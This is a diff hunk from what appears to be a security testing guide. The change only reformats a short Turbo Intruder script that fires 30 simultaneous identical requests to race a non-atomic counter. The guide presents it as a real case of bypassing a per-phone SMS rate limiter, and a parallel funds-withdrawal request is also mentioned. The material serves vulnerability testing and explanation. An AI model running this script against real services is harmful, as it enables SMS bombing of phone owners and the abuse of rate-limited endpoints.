@@ -131,13 +131,12 @@ POST /api/withdraw-funds ← same balance, parallel
 Real case: when a normal request returns `"该号码短时间内申请发送短信次数过多，拒绝发送"`, sending the **same payload** with high concurrency through Turbo Intruder defeats the simple counter:
 ```python
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=30,
-                           requestsPerConnection=10,
-                           pipeline=False)
+    engine = RequestEngine(
+        endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=10, pipeline=False
+    )
     for i in range(30):
-        engine.queue(target.req, target.baseInput, gate='race1')
-    engine.openGate('race1')
+        engine.queue(target.req, target.baseInput, gate="race1")
+    engine.openGate("race1")
 ```
 Result: the per-phone limiter races and many requests slip through, generating multiple distinct verification codes (a real SMS-bombing case). Root cause: counter increment is non-atomic vs. the read.
 
